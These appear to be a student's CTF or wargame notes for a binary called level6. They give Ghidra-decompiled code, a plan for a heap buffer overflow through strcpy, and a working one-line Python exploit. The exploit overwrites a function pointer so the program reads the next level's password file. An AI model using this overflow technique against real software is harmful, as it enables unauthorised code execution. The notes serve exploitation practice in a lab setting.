

/********************************/ 
/*	Ghidra decompiler       */
/********************************/ 

main:
  char *__dest;
  undefined4 *puVar1;
  
  __dest = (char *)malloc(0x40);
  puVar1 = (undefined4 *)malloc(4);
  *puVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (*(code *)*puVar1)();
  return;

m:
  puts("Nope");
  return;

n:
  system("/bin/cat /home/user/level7/.pass");
  return;

/********************************/ 
/*	      Infos		*/
/********************************/ 

Vulnerability with srctpy in size fixed buffer (0x40)

=> 73 char before segfault



Strategy:
-> overwrite m() called in *(*putvar) function to n() function, is it possible in an buffer overflow ? 
-> overwrite eip and return to n() function

!!!!! PAR PURE CHANCE => etre certain que l'eip est bien stocke et ecrase dans la heap par l'overflow !!!!

overflow -> try different padding 
-> 72 bytes + 4 bytes for addrress of m()

08048454 g     F .text	00000014              n

./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`

